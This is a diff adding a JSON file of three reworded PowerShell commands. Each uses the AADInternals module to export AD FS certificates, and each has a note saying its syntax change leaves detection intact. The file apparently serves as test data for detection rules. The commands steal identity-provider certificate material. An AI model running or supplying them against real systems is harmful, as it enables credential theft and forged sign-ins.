@@ -1,0 +1,14 @@
+[
+  {
+    "output": "\"powershell.exe\" -Command \"& {Import-Module AADInternals -Force; Export-AADIntADFSCertificates; Get-ChildItem | Where-Object {$_ -like 'ADFS*'}; Write-Host '`nCertificates retrieved successfully'}\"",
+    "explanation": "The original command is modified by using the -Command parameter instead of the script block syntax, and quotes are simplified for safe parsing. This preserves the same behavior while using a different syntax."
+  },
+  {
+    "output": "\"powershell.exe\" -Command \"& {Import-Module AADInternals -Force; $certs = Export-AADIntADFSCertificates; Get-ChildItem | Where-Object {$_ -like 'ADFS*'}; Write-Host '`nCertificates retrieved successfully'}\"",
+    "explanation": "This version introduces a variable assignment for the output of Export-AADIntADFSCertificates, which does not affect the detection but changes the command structure slightly."
+  },
+  {
+    "output": "\"powershell.exe\" -Command \"& {Import-Module AADInternals -Force; Export-AADIntADFSCertificates | Out-Null; Get-ChildItem | Where-Object {$_ -like 'ADFS*'}; Write-Host '`nCertificates retrieved successfully'}\"",
+    "explanation": "The output of Export-AADIntADFSCertificates is piped to Out-Null to suppress it, which changes the command slightly but does not affect the detection logic."
+  }
+]
